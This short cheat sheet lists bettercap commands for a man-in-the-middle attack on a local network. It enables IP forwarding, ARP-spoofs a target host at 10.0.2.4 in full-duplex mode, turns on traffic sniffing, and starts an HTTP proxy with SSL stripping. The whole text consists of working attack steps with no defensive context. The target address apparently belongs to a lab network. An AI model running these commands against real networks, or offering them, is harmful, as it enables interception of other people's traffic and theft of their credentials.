Listen network:

Redirect http and https traffic to port 8080:

	• echo "1" > /proc/sys/net/ipv4/ip_forward

	- net.probe on

Active ARP spoofing:

	• sudo bettercap
	• set arp.spoof.targets 10.0.2.4
	• set arp.spoof.fullduplex true
	• arp.spoof on

Active MITM listening:

	- set net.sniff.verbose false
	- net.sniff on

Active proxy:

	- set http.proxy.sslstrip true
	- http.proxy on
